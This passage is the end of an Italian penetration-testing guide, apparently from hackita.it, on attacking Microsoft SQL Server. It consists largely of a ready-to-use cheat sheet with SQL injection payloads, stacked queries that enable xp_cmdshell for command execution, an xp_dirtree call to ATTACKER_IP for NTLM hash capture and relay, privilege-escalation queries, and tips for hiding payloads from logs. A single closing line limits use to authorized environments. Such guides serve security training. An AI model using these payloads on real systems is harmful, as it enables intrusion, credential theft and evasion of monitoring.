| Tool                     | Uso                     | Comando base                              |
| ------------------------ | ----------------------- | ----------------------------------------- |
| **impacket-mssqlclient** | Shell interattiva       | `mssqlclient.py sa:pass@IP`               |
| **nxc / CrackMapExec**   | Brute force, enum, exec | `nxc mssql IP -u sa -p pass`              |
| **sqlmap**               | Injection automatica    | `sqlmap -r req.txt -p param --dbms=mssql` |
| **Responder**            | Hash capture            | `responder -I tun0`                       |
| **sqsh**                 | Client alternativo      | `sqsh -S IP -U user -P pass`              |
| **MSSQLPwner**           | Pivoting linked server  | `mssqlpwner corp.com/user:pass@IP`        |
| **Metasploit**           | Moduli MSSQL            | `use auxiliary/admin/mssql/mssql_enum`    |

**Metasploit — moduli utili:**

```
auxiliary/scanner/mssql/mssql_ping
auxiliary/admin/mssql/mssql_enum
admin/mssql/mssql_escalate_execute_as
admin/mssql/mssql_escalate_dbowner
exploit/windows/mssql/mssql_linkcrawler
auxiliary/admin/mssql/mssql_exec
auxiliary/scanner/mssql/mssql_hashdump
```

***

## 17. Percorso Operativo Consigliato {#17}

Sia che tu parta dalla porta 1433 che da una SQLi web, il percorso logico è questo:

```
1. TROVA MSSQL
   └─ nmap -sV -sC -p 1433,1434
   └─ parametro web vulnerabile

2. ACCEDI
   └─ credenziali deboli / brute force → mssqlclient
   └─ SQL injection web → UNION / blind / stacked

3. ENUMERA
   └─ DB_NAME(), SYSTEM_USER, versione
   └─ lista database → tabelle → colonne → dati
   └─ IS_SRVROLEMEMBER('sysadmin')

4. HASH CAPTURE (anche senza sysadmin)
   └─ xp_dirtree → Responder → hashcat -m 5600
   └─ se hash macchina ($) → ntlmrelayx relay

5. SCALA PRIVILEGI (se non sei sysadmin)
   └─ IMPERSONATE → EXECUTE AS LOGIN='sa'
   └─ db_owner + trustworthy → sp_elevate
   └─ linked server con mapping privilegiato

6. RCE (con sysadmin)
   └─ sp_configure xp_cmdshell → EXEC master..xp_cmdshell
   └─ whoami /priv → SeImpersonatePrivilege? → Potato attack
   └─ alternativa stealth: OLE Automation, Python

7. LINKED SERVER
   └─ sys.servers → EXECUTE AT
   └─ sp_helplinkedsrvlogin → verifica account remoto
   └─ chain SQL01 → SQL02 → SQL03

8. AD EXPOSURE
   └─ DEFAULT_DOMAIN()
   └─ GetUserSPNs → Kerberoasting del service account
   └─ nxc --rid-brute → enum utenti dominio
```

***

## 18. Troubleshooting {#18}

| Problema                        | Causa                              | Soluzione                                     |
| ------------------------------- | ---------------------------------- | --------------------------------------------- |
| Errore con `'` ma non `''`      | Stringa confermata                 | Prova `'-- -`, `')-- -`, `'))-- -`            |
| UNION funziona ma nessun output | Colonna visibile sbagliata         | Prova `'hackita'` in ogni posizione           |
| sqlmap non fingerprinta         | WAF blocca query MSSQL             | `--string="val" --flush-session --no-cast`    |
| sqlmap identifica FrontBase     | Falso positivo WAF                 | `--dbms=mssql --string="val" --flush-session` |
| `xp_cmdshell` negato            | Non sysadmin                       | Cerca impersonation o trustworthy DB          |
| Hash NTLMv2 account `$`         | Account macchina — password random | Usa ntlmrelayx invece di craccare             |
| Stacked query non eseguono      | App non supporta multi-statement   | Usa solo UNION o error-based                  |
| `WAITFOR` senza ritardo         | App usa timeout basso              | Aumenta a 10-15 secondi                       |
| Linked server errore            | Mapping credenziali sbagliato      | `EXEC sp_helplinkedsrvlogin 'NOME'`           |

***

## 19. FAQ {#19}

**Come capisco se è MSSQL e non MySQL?**
Usa `' AND @@CONNECTIONS>0-- -` (solo MSSQL) o `' AND 1=CONVERT(int,@@VERSION)-- -`. Se MySQL, @@CONNECTIONS non esiste.

**`-- -` e `--` sono identici?**
Quasi. `--` richiede uno spazio dopo per standard SQL. `-- -` è `--` + spazio + `-` — lo spazio garantisce validità su tutti i parser. In MSSQL funziona anche `--` senza spazio, ma `-- -` è più robusto.

**Perché aggiungere `;` alla fine di un payload stacked?**
Il `;` finale chiude esplicitamente il secondo statement prima del commento: `'; EXEC xp_cmdshell 'cmd';-- -`. Alcuni parser richiedono la chiusura esplicita — è buona pratica includerlo sempre.

**Quando uso `'` e quando `')`?**
Dipende dal contesto. Se l'errore sparisce con `')`, la query usa parentesi: `WHERE (colonna = 'INPUT')`.

**Posso fare hash capture senza sysadmin?**
Sì. `xp_dirtree` non richiede sysadmin — basta avere EXECUTE sulla stored procedure. Verifica con `EXEC sp_helprotect 'xp_dirtree'`.

**Il service account MSSQL è sempre Kerberoastable?**
Solo se ha un SPN registrato. Quasi sempre ce l'ha: `MSSQLSvc/hostname:1433`.

**Come ottengo RCE da una SQL Injection su MSSQL?**
Conferma injection → verifica stacked queries con `WAITFOR` → se sysadmin abilita `xp_cmdshell` → `EXEC master..xp_cmdshell 'cmd'`. Se non sei sysadmin, cerca impersonation o linked server.

***

## 20. Cheat Sheet Finale {#20}

```
=== PORTA 1433 ===
Scan:     nmap -sV -sC -p 1433,1434 TARGET
Named:    nmap -sU -p 1434 TARGET → poi scan porte dinamiche
Brute:    nxc mssql TARGET -u sa -p pass.txt
Connect:  mssqlclient.py sa:pass@TARGET
Win auth: mssqlclient.py -windows-auth CORP/user:pass@TARGET

=== CONTESTO WEB ===
Stringa:    '  → chiudi con '
Parentesi:  ') → chiudi con ')
Intero:     nessun apice

=== COMMENTI ===
POST/Burp:  -- -
GET URL:    --+
Spazi:      /**/ al posto degli spazi

=== VARIANTI DA PROVARE (in ordine) ===
' UNION SELECT 1,2,3-- -
') UNION SELECT 1,2,3-- -
' UNION SELECT NULL,NULL,NULL-- -
'/**/UNION/**/SELECT/**/1,2,3-- -
'+UNION+SELECT+1,2,3-- -
'; SELECT 1;-- -               (conferma stacked)
'; WAITFOR DELAY '0:0:5';-- -  (conferma time-based)

=== ENUM ===
DB corrente:  DB_NAME(), SYSTEM_USER, @@SERVERNAME
Lista DB:     FROM master..sysdatabases
Tabelle:      FROM NomeDB..sysobjects WHERE xtype='U'
Colonne:      FROM NomeDB.information_schema.columns WHERE table_name='X'
Dump:         SELECT col1+':'+col2 FROM DB..Table
Tutto:        FOR XML PATH('')

=== HASH CAPTURE (no sysadmin) ===
'; EXEC xp_dirtree '\\ATTACKER_IP\share';-- -
→ Responder: sudo responder -I tun0 -v
→ Crack: hashcat -m 5600 hash.txt rockyou.txt
→ Relay: ntlmrelayx.py se hash macchina ($)

=== RCE (sysadmin) ===
One liner: EXEC sp_configure 'Show Advanced Options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
Esegui:    EXEC master..xp_cmdshell 'whoami'
Bypass:    DECLARE @x='xp_cmdshell'; EXEC @x 'whoami'
SeImpersonate → GodPotato / PrintSpoofer

=== PRIVESC ===
Impersonation:  sys.server_permissions WHERE permission_name='IMPERSONATE'
TrustWorthy:    sys.databases WHERE is_trustworthy_on=1 + db_owner
Linked server:  sys.servers WHERE is_linked=1 → sp_helplinkedsrvlogin → EXECUTE AT

=== OPSEC ===
Nascondi dai log: payload-- -sp_password
Meno rumore:     OLE Automation, sp_execute_external_script
Pulizia:         DROP PROCEDURE sp_elevate; xp_cmdshell disabilita dopo uso
```

***

## Riferimenti

* [PayloadsAllTheThings – MSSQL Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MSSQL%20Injection/)
* [pentestmonkey – MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

**Guide correlate su hackita.it:**

* [SQL Injection: Guida Introduttiva](https://hackita.it/articoli/sql-injection)
* [Blind SQL Injection e Automazione con Python](https://hackita.it/articoli/blind-sql-injection)
* [sqlmap: Guida Completa](https://hackita.it/articoli/sqlmap)
* [Responder: Hash Capture e NTLM Relay](https://hackita.it/articoli/responder)
* [Kerberoasting e Service Account Attack](https://hackita.it/articoli/kerberos)
* [Active Directory Enumeration con BloodHound](https://hackita.it/articoli/active-directory)
* [Burp Suite: Intercettare e Modificare Richieste HTTP](https://hackita.it/articoli/burp-suite)

> Uso esclusivo in ambienti autorizzati.
